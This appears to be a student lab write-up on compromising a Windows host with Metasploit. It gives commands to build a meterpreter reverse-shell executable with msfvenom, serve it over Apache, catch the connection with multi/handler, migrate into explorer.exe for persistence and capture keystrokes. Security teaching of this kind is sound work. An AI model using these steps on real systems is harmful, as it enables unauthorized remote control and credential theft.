# Compromising-windows-using-Metasploit
Compromising windows using Metasploit

# Metasploit
Compromising windows using Metasploit

## AIM:
To Compromise windows using Metasploit .

## DESIGN STEPS:
### Step 1:
Install kali linux either in partition or virtual box or in live mode

### Step 2:
Investigate on the various categories of tools as follows:

### Step 3:
Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig

## OUTPUT:

![272774215-606e3364-b0b9-43b5-9250-795b7598c04e](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/eb925d99-616c-453c-8f38-d0e8f291c585)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT

![272774237-5dc05fce-63a2-47f9-b694-746b22ba200d](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/2c0e895a-d547-4239-87f1-49f5dafd488a)

copy the fun.exe into the apache /var/www/html folder image
![272774266-480f5425-ce40-497b-8b25-b7ad72bbaed8](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/229ec72b-141c-445e-90d6-8548a482df90)

Start apache server sudo systemctl apache2 start
![272774295-9d9a575a-d0d4-4463-adf7-ee84feedd93b](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/26ef8941-cf20-4a5f-81f7-9ce509f61dac)



Check the status of apache2 image
![272774317-15c93b77-e16e-4fb1-9b41-6a7aeb1cd19b](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/104fbda8-d611-4d54-8db8-c69aa68a7658)

Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit image
![272774391-f96bb7a2-4ba8-42d1-8c0e-f8f834e34bdc](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/5a170cb9-00fb-469e-9ce7-ca3debbe8a30)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. image
![272774478-17e4e8a1-f58e-422e-abd4-b79905434188](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/b320515b-e72f-4698-b928-f9456de8c7ae)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit image
![272774502-ae0f8e8c-f937-4ab1-85ad-1971688afc40](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/599d800c-bfa1-432f-8f87-a98ac2800401)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted image
![272774538-f6588fa0-2bf1-422e-a42f-cf7d687385a6](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/ad84f426-0f0a-40a5-bd0f-aa34113cff15)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name. image
![272774564-5409594d-f21d-4c89-9c27-7e3c5cc2ee27](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/f7d6f8d5-4a84-42ca-be54-a8b536c271c2)

keyscan_dump Shows the keystrokes captured so far image
![272774589-ea183567-a808-4dd4-81ca-9d782aae245c](https://github.com/durga46/Compromising-windows-using-Metasploit/assets/75235704/5ab8e4b7-7436-440a-9c26-b66df000cd80)

## RESULT:
The Metasploit framework is used to compromise windows and is examined successfully.





